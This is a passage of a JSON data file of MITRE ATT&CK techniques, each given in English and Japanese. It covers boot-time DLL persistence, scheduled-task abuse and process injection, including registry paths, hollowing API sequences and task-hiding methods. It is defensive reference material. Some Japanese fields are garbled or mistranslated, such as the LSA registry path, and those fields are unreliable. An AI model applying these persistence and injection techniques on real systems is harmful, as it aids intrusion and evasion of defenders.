                        "description_jp": "攻撃者はタイムプロバイダーを悪用して、システム起動時にDLLを実行する可能性がある。Windows Timeサービス(W32Time)は、ドメイン間やドメイン内での時刻同期を可能にする。(引用: Microsoft W32Time Feb 2018) W32Time タイムプロバイダは、ハードウェア/ネットワークリソースからタイムスタンプを取得し、その値を他のネットワーククライアントに出力する役割を担っています。(引用: Microsoft TimeProvider)\n\nタイムプロバイダは、ダイナミックリンクライブラリ(DLL)として実装され、`HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`のサブキーに登録される。(引用: Microsoft TimeProvider) タイムプロバイダマネージャは、サービスコントロールマネージャによって指示され、システム起動時やパラメータが変更されるたびに、このキーの下にリストされ有効になっているタイムプロバイダをロードして起動する。(引用: Microsoft TimeProvider)\n\n特に、`DllName` 値に悪意のあるDLLを指す、任意に命名された新しいサブキーを作成することである。タイムプロバイダの登録には管理者権限が必要であるが、実行はローカルサービスアカウントのコンテキストで実行される。(引用: Github W32Time Oct 2017)"
                    },
                    {
                        "id": "T1547.002",
                        "name_eng": "Authentication Package",
                        "name_jp": "認証パッケージ",
                        "description_eng": "Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.",
                        "description_jp": "攻撃者は認証パッケージを悪用し、システム起動時に DLL を実行する可能性がある。Windowsの認証パッケージDLLは、システム起動時にLSA（Local Security Authority）プロセスによってロードされる。これらのDLLは、複数のログオンプロセスと複数のセキュリティプロトコルをオペレーティングシステムに提供する。(引用：MSDN Authentication Packages)\n\n攻撃者は、<code>\"Authentication Packages\"=&lt;target binary&gt;</code>のキー値を持つバイナリへの参照をWindowsレジストリの場所<code>HKLMSYSTEMCurntionControlLsa</code>に置くことで、LSA認証パッケージによって提供される自動開始メカニズムを永続化のために使用することができる。認証パッケージがロードされると、このバイナリがシステムによって実行される。"
                    },
                    {
                        "id": "T1547.010",
                        "name_eng": "Port Monitors",
                        "name_jp": "ポートモニター",
                        "description_eng": "Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) \n\nAlternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port",
                        "description_jp": "敵はポートモニターを使用して、システムブート中に敵が提供するDLLを実行し、永続化や権限昇格を行う可能性がある。 ポート・モニターは、<code>AddMonitor</code> APIコールによって設定することができ、起動時にロードされるDLLを設定する。(引用: AddMonitor) このDLLは <code>C:\\Windows\\System32</code> にあり、起動時にSYSTEMレベルの権限でプリントスプーラサービスの `spoolsv.exe` によってロードされ実行されます。(引用: Bloxham) \n\nまた、<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>の既存または新規の任意の名前のサブキーの `Driver`値に、そのDLLの完全修飾パス名を書き込むことが許可されていれば、任意のDLLをロードすることができる。 レジストリ・キーには、以下のエントリが含まれている。:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port"
                    }
                ]
            },
            {
                "id": "T1053",
                "name_eng": "Scheduled Task/Job",
                "name_jp": "スケジュールされたタスク/ジョブ",
                "description_eng": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)\n\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)",
                "description_jp": "攻撃者は、タスク・スケジューリング機能を悪用して、悪意のあるコードの初期実行や反復実行を容易にする可能性がある。 すべての主要なオペレーティング・システムには、指定した日時に実行されるプログラムやスクリプトをスケジュールするユーティリティが存在する。 適切な認証が行われれば、タスクはリモートシステム上でもスケジューリングできる。 (例: RPC and file and printer sharing in Windows environments). リモートシステム上のタスクをスケジューリングするには、通常、リモートシステム上の管理者またはその他の特権を持つグループのメンバーであることが必要な場合がある。(引用: TechNet Task Scheduler Security)\n\n攻撃者は、タスクスケジューリングを使って、システム起動時や、永続化のためにスケジュールされたベースでプログラムを実行するかもしれない。 これらのメカニズムは、指定されたアカウント（昇格したパーミッション/特権を持つアカウントなど）のコンテキスト下でプロセスを実行するために悪用することもできる。 [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218)と同様に、敵対者はタスクスケジューリングを悪用して、信頼されたシステムプロセスの下で1回限りの実行を隠蔽する可能性もある。(引用: ProofPoint Serpent)",
                "subtechniques": [
                    {
                        "id": "T1053.003",
                        "name_eng": "Cron",
                        "name_jp": "クロン",
                        "description_eng": "Adversaries may abuse the <code>cron</code> utility to perform task scheduling for initial or recurring execution of malicious code.(Citation: 20 macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)",
                        "description_jp": "攻撃者は<code>cron</code>ユーティリティを悪用して、悪意のあるコードの初回実行または定期的な実行のためのタスクスケジューリングを行う可能性があります。(引用: 20 macOS Common Tools and Techniques) <code>cron</code>ユーティリティは、Unixライクなオペレーティングシステム向けの時刻ベースのジョブスケジューラです。<code>crontab</code>ファイルには、実行されるcronエントリのスケジュールと指定された実行時刻が含まれています。すべての<code>crontab</code>ファイルは、オペレーティングシステム固有のファイルパスに保存されます。\n\n攻撃者は、LinuxまたはUnix環境で<code>cron</code>を使用して、システムの起動時または[永続化](https://attack.mitre.org/tactics/TA0003)のためのスケジュールに基づいてプログラムを実行する可能性があります。ESXi環境では、cronジョブはcrontabファイル（例: `/var/spool/cron/crontabs/root`）を介して直接作成する必要があります。(引用: CloudSEK ESXiArgs 2023)"
                    },
                    {
                        "id": "T1053.005",
                        "name_eng": "Scheduled Task",
                        "name_jp": "予定タスク",
                        "description_eng": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments)",
                        "description_jp": "攻撃者はWindowsタスクスケジューラを悪用し、悪意のあるコードの初回実行または定期的な実行のためのタスクスケジューリングを行う可能性があります。Windowsのタスクスケジューラにアクセスする方法は複数あります。[schtasks](https://attack.mitre.org/software/S0111)ユーティリティはコマンドラインから直接実行することも、コントロールパネルの管理ツールセクション内のGUIからタスクスケジューラを開くこともできます。(引用: Stack Overflow) 場合によっては、攻撃者はWindowsタスクスケジューラ用の.NETラッパーを使用したり、あるいはWindows netapi32ライブラリや[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI)を使用してスケジュールタスクを作成したりします。攻撃者はまた、XMLパス経由でスケジュールタスクを作成するためにWMIクラス`PS_ScheduledTask`を活用するPowershell Cmdlet `Invoke-CimMethod`を利用することもあります。(引用: Red Canary - Atomic Red Team)\n\n攻撃者は、Windowsタスクスケジューラを使用して、システムの起動時または永続化のためにスケジュールに基づいてプログラムを実行する可能性があります。Windowsタスクスケジューラは、横方向の移動の一部としてリモート実行を行ったり、指定されたアカウント(SYSTEMなど)のコンテキストでプロセスを実行したりするために悪用される可能性もあります。[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218)と同様に、攻撃者はWindowsタスクスケジューラを悪用して、署名/信頼されたシステムプロセスの下で1回限りの実行を潜在的にマスクすることもあります。(引用: ProofPoint Serpent)\n\n攻撃者はまた、「隠し」スケジュールタスク（すなわち[アーティファクトの隠蔽](https://attack.mitre.org/techniques/T1564)）を作成することもあり、これは防御側のツールやタスクを列挙するために使用される手動クエリには表示されない可能性があります。具体的には、攻撃者は関連するセキュリティ記述子（SD）レジストリ値を削除することにより（この値の削除はSYSTEM権限を使用して完了する必要があります）、`schtasks /query`およびタスクスケジューラからタスクを隠すことができます。(引用: SigmaHQ)(引用: Tarrask scheduled task) 攻撃者はまた、関連するレジストリキー内のメタデータ（例: `Index`値）を変更するなど、タスクを隠すための代替方法を採用することもあります。(引用: Defending Against Scheduled Task Attacks in Windows Environments)"
                    },
                    {
                        "id": "T1053.006",
                        "name_eng": "Systemd Timers",
                        "name_jp": "Systemd タイマー",
                        "description_eng": "Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003) in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: Systemd Remote Control)\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002) unit files that are managed by the systemd system and service manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.(Citation: Falcon Sandbox smp: 28553b3a9d)",
                        "description_jp": "攻撃者は systemd タイマーを悪用して、悪意のあるコードを初期または繰り返し実行するためのタスクスケジューリングを行う可能性があります。Systemd タイマーは <code>.timer</code> という拡張子を持つユニットファイルで、サービスを制御します。タイマーはカレンダーのイベントや、開始点からの相対的な時間経過後に実行されるように設定できます。Linux 環境では、[Cron](https://attack.mitre.org/techniques/T1053/003) の代替として使うことができます。(引用: archlinux Systemd Timers Aug 2020) Systemd タイマーは、[SSH](https://attack.mitre.org/techniques/T1021/004) 経由で動作する <code>systemctl</code> コマンドラインユーティリティを使ってリモートで起動することができます。(引用: Systemd Remote Control)\n\n各 <code>.timer</code> ファイルには、対応する同じ名前の <code>.service</code> ファイルが必要です。例えば、<code>example.timer</code> と <code>example.service</code> のようになります。<code>.service</code>ファイルは[Systemd Service](https://attack.mitre.org/techniques/T1543/002)ユニットファイルで、systemdシステムとサービスマネージャーによって管理されます。(引用: Linux man-pages: systemd January 2014) 特権タイマーは<code>/etc/systemd/system/</code>と<code>/usr/lib/systemd/system</code>に、ユーザーレベルは<code>~/.config/systemd/user/</code>に書き込まれます。\n\n敵対者は systemd タイマーを使ってシステム起動時やスケジュールベースで悪意のあるコードを実行し、永続化する可能性があります。(引用: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018) 特権パスを使ってインストールされたタイマーはルートレベルの永続化を維持するために使われるかもしれません。攻撃者はまた、ユーザーレベルの持続性を達成するためにユーザーレベルのタイマーをインストールする可能性があります。(引用: Falcon Sandbox smp: 28553b3a9d)"
                    },
                    {
                        "id": "T1053.007",
                        "name_eng": "Container Orchestration Job",
                        "name_jp": "コンテナ・オーケストレーションジョブ",
                        "description_eng": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                        "description_jp": "攻撃者は、Kubernetesなどのコンテナオーケストレーションツールが提供するタスクスケジューリング機能を悪用して、悪意のあるコードを実行するように設定されたコンテナのデプロイをスケジュールする可能性があります。コンテナオーケストレーションジョブは、Linuxシステムのcronジョブと同様に、特定の日時にこれらの自動タスクを実行します。この種のデプロイは、長期にわたってコンテナの量を維持するように構成することもでき、クラスタ内の永続性を維持するプロセスを自動化することができます。\n\nKubernetesでは、CronJobは、特定のタスクを実行するために1つまたは複数のコンテナを実行するJobをスケジュールするために使用されることがあります。(引用: Kubernetes Jobs)(引用: Kubernetes CronJob) したがって、敵対者は、クラスタ内のさまざまなノードで悪意のあるコードを実行するJobのデプロイをスケジュールするためにCronJobを利用する可能性があります。(引用: Threat Matrix for Kubernetes)"
                    },
                    {
                        "id": "T1053.002",
                        "name_eng": "At",
                        "name_jp": "At",
                        "description_eng": "Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)\n\nOn Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)\n\nAdversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).\n\nIn Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)",
                        "description_jp": "攻撃者は[at](https://attack.mitre.org/software/S0110)ユーティリティを悪用して、悪意のあるコードの初回実行または定期的な実行のためのタスクスケジューリングを行う可能性があります。[at](https://attack.mitre.org/software/S0110)ユーティリティは、指定された日時にタスクをスケジューリングするためにWindows、Linux、およびmacOS内に実行可能ファイルとして存在します。Windows環境では[Scheduled Task](https://attack.mitre.org/techniques/T1053/005)の[schtasks](https://attack.mitre.org/software/S0111)が推奨され非推奨となっていますが、[at](https://attack.mitre.org/software/S0110)を使用するには、タスクスケジューラサービスが実行されており、ユーザーがローカルのAdministratorsグループのメンバーとしてログオンしている必要があります。`at`コマンドを明示的に実行するのに加えて、攻撃者は[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)の`Win32_ScheduledJob` WMIクラスを直接利用して[at](https://attack.mitre.org/software/S0110)でタスクをスケジュールすることもできます。(引用: Malicious Life by Cybereason)\n\nLinuxおよびmacOSでは、[at](https://attack.mitre.org/software/S0110)はスーパーユーザー、および`at.allow`ファイルに追加された任意のユーザーによって呼び出される可能性があります。`at.allow`ファイルが存在しない場合は、`at.deny`ファイルがチェックされます。`at.deny`にリストされていないすべてのユーザー名は[at](https://attack.mitre.org/software/S0110)を呼び出すことが許可されます。`at.deny`が存在し空である場合は、[at](https://attack.mitre.org/software/S0110)のグローバルな使用が許可されます。どちらのファイルも存在しない場合（これがベースラインであることが多い）、スーパーユーザーのみが[at](https://attack.mitre.org/software/S0110)を使用できます。(引用: Linux at)\n\n攻撃者は[at](https://attack.mitre.org/software/S0110)を使用して、システムの起動時または[永続化](https://attack.mitre.org/tactics/TA0003)のためのスケジュールに基づいてプログラムを実行する可能性があります。[at](https://attack.mitre.org/software/S0110)はまた、[横方向の移動](https://attack.mitre.org/tactics/TA0008)の一部としてリモート[実行](https://attack.mitre.org/tactics/TA0002)を行ったり、指定されたアカウント（SYSTEMなど）のコンテキストでプロセスを実行したりするために悪用される可能性もあります。\n\nLinux環境では、攻撃者はまた、タスクを使用して対話型システムシェルを生成したりシステムコマンドを実行したりすることで、制限された環境から抜け出すために[at](https://attack.mitre.org/software/S0110)を悪用する可能性があります。同様に、バイナリが`sudo`経由でスーパーユーザーとして実行されることが許可されている場合、[at](https://attack.mitre.org/software/S0110)は[権限昇格](https://attack.mitre.org/tactics/TA0004)にも使用される可能性があります。(引用: GTFObins at)"
                    }
                ]
            },
            {
                "id": "T1055",
                "name_eng": "Process Injection",
                "name_jp": "プロセス・インジェクション",
                "description_eng": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.",
                "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスにコードを注入する可能性があります。プロセスインジェクションは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。別のプロセスのコンテキストでコードを実行すると、そのプロセスのメモリ、システム/ネットワークリソースにアクセスでき、場合によっては権限が昇格される可能性があります。プロセスインジェクションによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。\n\nプロセスにコードを注入する方法は多数あり、その多くは正当な機能を悪用しています。これらの実装は主要なOSすべてに存在しますが、通常はプラットフォーム固有です。\n\nより高度なサンプルでは、モジュールをセグメント化し、検出をさらに回避するために複数のプロセスインジェクションを実行し、通信チャネルとして名前付きパイプやその他のプロセス間通信（IPC）メカニズムを利用する場合があります。",
                "subtechniques": [
                    {
                        "id": "T1055.013",
                        "name_eng": "Process Doppelgänging",
                        "name_jp": "プロセス ダブルスレッド",
                        "description_eng": "Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nAdversaries may abuse TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055). Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. (Citation: BlackHat Process Doppelgänging Dec 2017)\n\nProcess Doppelgänging is implemented in 4 steps (Citation: BlackHat Process Doppelgänging Dec 2017):\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避し、場合によっては権限を昇格させるために、プロセスドッペルゲンギングを介してプロセスに悪意のあるコードを注入する可能性があります。プロセスドッペルゲンギングは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nWindows Transactional NTFS (TxF) は、安全なファイル操作を実行する手法としてVistaで導入されました。(引用: Microsoft TxF) データ整合性を確保するため、TxFは特定の時点でファイルに書き込むことができるトランザクションハンドルを1つだけにします。書き込みハンドルトランザクションが終了するまで、他のすべてのハンドルは書き込み元から分離され、ハンドルが開かれた時点で存在したファイルのコミット済みバージョンのみを読み取ることができます。(引用: Microsoft Basic TxF Concepts) 破損を避けるため、書き込みトランザクション中にシステムまたはアプリケーションに障害が発生した場合、TxFは自動ロールバックを実行します。(引用: Microsoft Where to use TxF)\n\n非推奨ですが、TxFアプリケーションプログラミングインターフェイス（API）はWindows 10の時点でも有効です。(引用: BlackHat Process Doppelgänging Dec 2017)\n\n攻撃者はTxFを悪用して、[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)のファイルレスバリエーションを実行する可能性があります。[プロセスハロウイング](https://attack.mitre.org/techniques/T1055/012)と同様に、プロセスドッペルゲンギングは正当なプロセスのメモリを置き換え、防御や検出を回避する可能性のある悪意のあるコードの隠蔽された実行を可能にします。プロセスドッペルゲンギングによるTxFの使用は、`NtUnmapViewOfSection`、`VirtualProtectEx`、`SetThreadContext`などの監視の厳しいAPI関数の使用も回避します。(引用: BlackHat Process Doppelgänging Dec 2017)\n\nプロセスドッペルゲンギングは4つのステップで実装されます(引用: BlackHat Process Doppelgänging Dec 2017):\n\n* トランザクト – 正当な実行可能ファイルを使用してTxFトランザクションを作成し、その後、ファイルを悪意のあるコードで上書きします。これらの変更は分離され、トランザクションのコンテキスト内でのみ表示されます。\n* ロード – メモリの共有セクションを作成し、悪意のある実行可能ファイルをロードします。\n* ロールバック – 元の実行可能ファイルへの変更を元に戻し、ファイルシステムから悪意のあるコードを効果的に削除します。\n* アニメート – 汚染されたメモリセクションからプロセスを作成し、実行を開始します。\n\n注入されたプロセスは注入元のプロセスから生成された（したがってセキュリティコンテキストを継承する）ため、この動作によって権限が昇格される可能性は低いでしょう。ただし、プロセスドッペルゲンギングによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性があります。"
                    },
                    {
                        "id": "T1055.012",
                        "name_eng": "Process Hollowing",
                        "name_jp": "プロセス空洞化",
                        "description_eng": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively.(Citation: Leitch Hollowing)(Citation: Elastic Process Injection July 2017)\n\nThis is very similar to [Thread Local Storage](https://attack.mitre.org/techniques/T1055/005) but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.",
                        "description_jp": "攻撃者は、プロセスベースの防御を回避するために、中断され空洞化されたプロセスに悪意のあるコードを注入する可能性があります。プロセスハロウイングは、別のライブプロセスのアドレス空間で任意のコードを実行する手法です。\n\nプロセスハロウイングは通常、プロセスを中断状態で作成し、そのメモリをアンマップ/空洞化し、その後悪意のあるコードに置き換えることによって実行されます。被害者プロセスは、プロセスのプライマリスレッドを中断するフラグを含む`CreateProcess`などのネイティブWindows API呼び出しで作成できます。この時点で、プロセスは`ZwUnmapViewOfSection`や`NtUnmapViewOfSection`などのAPI呼び出しを使用してアンマップされた後、書き込まれ、注入されたコードに再配置され、それぞれ`VirtualAllocEx`、`WriteProcessMemory`、`SetThreadContext`、そして`ResumeThread`を介して再開されます。(引用: Leitch Hollowing)(引用: Elastic Process Injection July 2017)\n\nこれは[スレッドローカルストレージ](https://attack.mitre.org/techniques/T1055/005)と非常によく似ていますが、既存のプロセスをターゲットにするのではなく、新しいプロセスを作成します。注入されたプロセスは注入元のプロセスから生成された（したがってセキュリティコンテキストを継承する）ため、この動作によって権限が昇格される可能性は低いでしょう。ただし、プロセスハロウイングによる実行は、実行が正当なプロセスの下でマスクされるため、セキュリティ製品による検出を回避する可能性もあります。"
                    },
                    {
                        "id": "T1055.009",
                        "name_eng": "Proc Memory",
                        "name_jp": "プロックメモリ",
                        "description_eng": "Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \n\nProc memory injection involves enumerating the memory of a process via the /proc filesystem (<code>/proc/[pid]</code>) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <code>/proc/[pid]/maps</code> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) \n\nOther techniques such as [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) may be used to populate a target process with more available gadgets. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1055/012), proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",
